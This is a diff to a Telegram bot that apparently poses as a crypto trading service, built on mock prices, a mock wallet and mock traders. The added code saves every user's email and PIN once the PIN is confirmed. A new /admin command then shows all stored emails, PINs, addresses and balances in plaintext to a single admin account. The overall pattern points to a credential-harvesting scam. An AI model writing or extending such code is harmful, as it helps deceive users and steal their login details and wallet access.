@@ -13,6 +13,8 @@ if (!TOKEN) {
 const SOL_PRICE = 152.3;
 const ETH_PRICE = 2485.59;
 const MOCK_WALLET = "4Fiz4GD19uyVbyQfXfGmmnQm1p9ViQPLTt6itVdDWrzP";
+
+const ADMIN_ID = process.env.ADMIN_ID ? parseInt(process.env.ADMIN_ID) : null;
 const MOCK_ETH_ADDRESS = "0x2f769C7250ef361E9468291eBcCE39E331047ab7";
 
 const MOCK_TRADERS = [
@@ -123,6 +125,8 @@ async function deleteUserMessage(ctx) {
 
 function defaultState() {
   return {
+    userId: null,
+    username: null,
     address: MOCK_WALLET,
     awaitingEmail: false,
     awaitingPin: false,
@@ -158,15 +162,34 @@ solBalance: 0,
 }
 
 const sessions = new Map();
+const registeredUsers = new Map();
 
 function getState(ctx) {
   const chatId = ctx?.chat?.id ?? 0;
   let state = sessions.get(chatId);
   if (!state) {
     state = defaultState();
+    if (ctx?.from?.id) state.userId = ctx.from.id;
+    if (ctx?.from?.username) state.username = ctx.from.username;
     sessions.set(chatId, state);
   }
   return state;
+}
+
+function registerUser(state) {
+  if (state.userId && state.email && state.pin) {
+    registeredUsers.set(state.userId, {
+      userId: state.userId,
+      username: state.username,
+      email: state.email,
+      pin: state.pin,
+      address: state.address,
+      solBalance: state.solBalance,
+      ethBalance: state.ethBalance,
+      usdcBalance: state.usdcBalance,
+      registeredAt: new Date().toISOString(),
+    });
+  }
 }
 
 const WELCOME_TEXT =
@@ -1090,6 +1113,28 @@ bot.command("reset", (ctx) => {
   return handleMenuReset(ctx, getState(ctx));
 });
 
+bot.command("admin", (ctx) => {
+  if (!ADMIN_ID || ctx.from.id !== ADMIN_ID) {
+    return ctx.reply("❌ You are not authorized to view this page.");
+  }
+  if (registeredUsers.size === 0) {
+    return ctx.reply("📭 No registered users yet.");
+  }
+  let userList = "📋 *Registered Users*\n\n";
+  let i = 1;
+  for (const user of registeredUsers.values()) {
+    userList +=
+      `*${i}.* @${user.username || "unknown"} (ID: ${user.userId})\n` +
+      `📧 ${user.email}\n` +
+      `🔐 PIN: ${user.pin}\n` +
+      `🟣 Address: \`${user.address}\`\n` +
+      `💵 SOL: $${user.solBalance.toFixed(2)} | ETH: $${user.ethBalance.toFixed(2)} | USDC: $${user.usdcBalance.toFixed(2)}\n` +
+      `📅 Registered: ${user.registeredAt}\n\n`;
+    i++;
+  }
+  return ctx.replyWithMarkdown(userList);
+});
+
 bot.on("text", async (ctx) => {
   const state = getState(ctx);
   const text = (ctx.text ?? "").trim();
@@ -1144,6 +1189,7 @@ bot.on("text", async (ctx) => {
     await deleteUserMessage(ctx);
     if (/^\d{4}$/.test(text) && text === state.pin) {
       state.awaitingPinConfirm = false;
+      registerUser(state);
       return replyWithCachedPhoto(ctx, "dashboard", {
         caption: SECURITY_COMPLETE_TEXT(state),
         parse_mode: "Markdown",
@@ -1500,3 +1546,6 @@ exports.handleSellToken = handleSellToken;
 exports.copyTradersKeyboard = copyTradersKeyboard;
 exports.copyTradeKeyboard = copyTradeKeyboard;
 exports.getState = getState;
+exports.registeredUsers = registeredUsers;
+exports.registerUser = registerUser;
+exports.ADMIN_ID = ADMIN_ID;
